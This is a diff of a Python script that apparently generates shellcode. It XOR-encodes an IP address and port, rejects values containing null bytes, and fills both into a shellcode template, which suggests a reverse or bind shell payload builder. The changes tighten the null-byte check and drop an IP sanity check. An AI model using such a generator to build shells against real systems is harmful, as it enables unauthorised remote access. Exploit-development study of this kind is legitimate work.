@@ -18,9 +18,10 @@ def main(ip, port):
         print("[-] Port: {}".format(hex_port))
         sys.exit(1)
 
-    if "\\x00" in hex_ip:
-        print("[-] Sorry, a null byte was found in the XORed value, this is the end for you...")
-        print("[-] Value: {}".format(hex_ip))
+    if "\\x00" in hex_ip or "\\x0" in hex_ip:
+        print("[-] Sorry, a null byte was found in the XORed IP, this is the end for you...")
+        print("[-] XORed Value: {}".format(hex_ip))
+        sys.exit(1)
 
     shellcode = shellcode.replace("{port}", hex_port)
     shellcode = shellcode.replace("{ip}", hex_ip)
@@ -41,9 +42,5 @@ if __name__ == "__main__":
         if (int(sys.argv[2]) > 65535):
             print("[-] Port too large")
             sys.exit(1)
-        if sys.argv[1] == "255.255.255.255" or sys.argv[1] == "0.0.0.0":
-            print("[-] Invalid IP!")
-            sys.exit(1)
         main(sys.argv[1], int(sys.argv[2]))
-    else:
-        main(1337)
+
